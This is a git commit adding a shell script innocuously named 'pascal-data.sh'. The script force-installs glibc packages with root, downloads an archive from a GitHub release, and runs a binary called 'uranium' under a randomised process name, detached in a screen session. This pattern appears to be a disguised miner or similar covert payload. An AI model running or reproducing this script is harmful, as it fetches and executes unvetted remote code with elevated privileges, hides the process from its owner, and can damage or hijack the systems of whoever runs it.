3aa151117911aadaff5cd5980196b47a3f167340
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2019-08-22 09:14:29 +0700

    Create pascal-data.sh

---
+++ pascal-data.sh
@@ -0,0 +1,24 @@
+#!/bin/bash
+wget http://copr-be.cloud.fedoraproject.org/results/mosquito/myrepo-el6/epel-6-x86_64/glibc-2.17-55.fc20/glibc-2.17-55.el6.x86_64.rpm
+wget http://copr-be.cloud.fedoraproject.org/results/mosquito/myrepo-el6/epel-6-x86_64/glibc-2.17-55.fc20/glibc-common-2.17-55.el6.x86_64.rpm
+wget http://copr-be.cloud.fedoraproject.org/results/mosquito/myrepo-el6/epel-6-x86_64/glibc-2.17-55.fc20/glibc-devel-2.17-55.el6.x86_64.rpm
+wget http://copr-be.cloud.fedoraproject.org/results/mosquito/myrepo-el6/epel-6-x86_64/glibc-2.17-55.fc20/glibc-headers-2.17-55.el6.x86_64.rpm
+sudo rpm -Uvh glibc-2.17-55.el6.x86_64.rpm \
+glibc-common-2.17-55.el6.x86_64.rpm \
+glibc-devel-2.17-55.el6.x86_64.rpm \
+glibc-headers-2.17-55.el6.x86_64.rpm --force --nodeps
+azure=mxsemsdnlkdj;
+mkdir /usr/local
+mkdir /usr/local/src
+rm -r /usr/local/src/$azure
+rm -r platinum.tar.gz
+wget https://github.com/ts6aud5vkg/gpuissa/releases/download/metan/platinum.tar.gz
+tar xf platinum.tar.gz
+rm -r platinum.tar.gz
+mv platinum /usr/local/src/$azure
+a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+cd /usr/local/src/$azure
+sudo cp uranium "$cpuname"
+echo $cpuname" is starting"
+screen -d -m ./"${cpuname}"
+
